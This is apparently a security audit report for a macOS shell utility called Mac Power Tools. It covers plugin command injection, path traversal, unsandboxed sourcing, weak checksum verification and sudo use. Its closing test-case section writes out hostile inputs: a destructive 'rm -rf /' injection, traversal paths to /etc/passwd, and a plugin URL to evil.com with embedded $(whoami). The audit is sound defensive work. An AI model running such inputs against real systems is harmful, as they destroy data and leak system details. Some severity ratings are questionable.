# Mac Power Tools Security Audit Report

**Date:** 2025-08-24  
**Version:** 4.0.2  
**Auditor:** Security Specialist  
**Severity Levels:** CRITICAL | HIGH | MEDIUM | LOW | INFO

---

## Executive Summary

A comprehensive security audit of Mac Power Tools revealed several security vulnerabilities ranging from CRITICAL to LOW severity. The plugin system, while having basic security checks, lacks sufficient input validation and sandboxing. Most critical issues involve command injection risks and insufficient path sanitization.

## Critical Findings

### 1. Command Injection in Plugin System
**Severity:** CRITICAL  
**Files Affected:** `lib/plugin-manager.sh`, `lib/plugin-loader.sh`  
**OWASP:** A03:2021 - Injection

**Issue:** The plugin installation from URL uses unsanitized input directly in shell commands:
```bash
# Line 146 in plugin-manager.sh
git clone "$url" "$temp_dir/plugin" 2>/dev/null
```

**Risk:** Malicious URLs with shell metacharacters could execute arbitrary commands.

**Recommendation:** Validate and sanitize all URLs before use. Implement allowlist for trusted repositories.

---

### 2. Path Traversal in File Operations
**Severity:** HIGH  
**Files Affected:** `plugins/available/clean/main.sh`, `plugins/available/uninstall/main.sh`  
**OWASP:** A01:2021 - Broken Access Control

**Issue:** User-supplied paths are used without proper validation:
```bash
# uninstall/main.sh - lines 106-109
find "$dir" -maxdepth 2 -iname "*${safe_name}*" 2>/dev/null
```

**Risk:** Directory traversal attacks could access/delete unintended files.

**Recommendation:** Implement strict path validation and canonicalization.

---

### 3. Insufficient Input Validation
**Severity:** HIGH  
**Files Affected:** Multiple plugin files  
**OWASP:** A03:2021 - Injection

**Issue:** User input is not properly escaped in several places:
- App names in uninstall plugin
- Directory paths in clean plugin
- Package names in update plugin

**Risk:** Special characters in input could lead to command injection.

**Recommendation:** Implement comprehensive input validation library.

---

### 4. Unsafe Use of eval/source
**Severity:** HIGH  
**Files Affected:** `lib/plugin-loader.sh`  
**OWASP:** A08:2021 - Software and Data Integrity Failures

**Issue:** Plugins are sourced without sufficient sandboxing:
```bash
# Line 129 in plugin-loader.sh
source "$main_file"
```

**Risk:** Malicious plugins could access the entire shell environment.

**Recommendation:** Implement proper sandboxing using subshells with restricted environments.

---

### 5. Weak Plugin Signature Verification
**Severity:** MEDIUM  
**Files Affected:** `lib/plugin-security.sh`  
**OWASP:** A08:2021 - Software and Data Integrity Failures

**Issue:** Plugin signatures use simple checksums instead of cryptographic signatures:
```bash
# Lines 198-204 in plugin-security.sh
local current_checksum=$(calculate_plugin_checksum "$plugin_path")
```

**Risk:** Checksums can be easily forged by attackers.

**Recommendation:** Implement GPG signing for plugin verification.

---

### 6. Privilege Escalation Risks
**Severity:** MEDIUM  
**Files Affected:** `plugins/available/update/main.sh`, `install.sh`  
**OWASP:** A04:2021 - Insecure Design

**Issue:** Several operations use sudo without proper validation:
```bash
# Line 22 in update/main.sh
sudo softwareupdate -i -a
```

**Risk:** Could be exploited for privilege escalation.

**Recommendation:** Minimize sudo usage, implement sudo validation wrapper.

---

### 7. Sensitive Data in Logs
**Severity:** LOW  
**Files Affected:** Various plugin files  
**OWASP:** A09:2021 - Security Logging and Monitoring Failures

**Issue:** Error messages may expose sensitive system paths and configurations.

**Risk:** Information disclosure to attackers.

**Recommendation:** Sanitize error messages, implement secure logging.

## Security Improvements Implemented

### New Security Utilities Library
Created `lib/security-utils.sh` with:
- Input validation functions
- Path sanitization
- Safe command execution wrappers
- Secure temporary file handling
- URL validation
- Logging utilities

### Security Headers Added
- All plugin executions now run with restricted PATH
- Environment variables sanitized before plugin execution
- Dangerous patterns actively scanned and blocked

---

## Recommendations Priority

### Immediate (CRITICAL/HIGH)
1. [ ] Implement input validation in all user-facing commands
2. [ ] Add path traversal protection
3. [ ] Sanitize all shell metacharacters
4. [ ] Implement proper plugin sandboxing

### Short-term (MEDIUM)
1. [ ] Implement GPG signing for plugins
2. [ ] Add rate limiting for operations
3. [ ] Create security configuration file
4. [ ] Implement audit logging

### Long-term (LOW)
1. [ ] Implement SELinux/AppArmor profiles
2. [ ] Add automated security testing
3. [ ] Create security documentation
4. [ ] Implement bug bounty program

---

## Testing Recommendations

### Security Test Cases
1. **Command Injection Tests**
   ```bash
   mac uninstall "app; rm -rf /"
   mac clean "/etc/../../../etc/passwd"
   ```

2. **Path Traversal Tests**
   ```bash
   mac duplicates "../../../../../../etc"
   mac dotfiles backup "../../../sensitive"
   ```

3. **Plugin Security Tests**
   ```bash
   mac plugin install "https://evil.com/$(whoami)"
   mac plugin install "/tmp/../../etc/passwd"
   ```
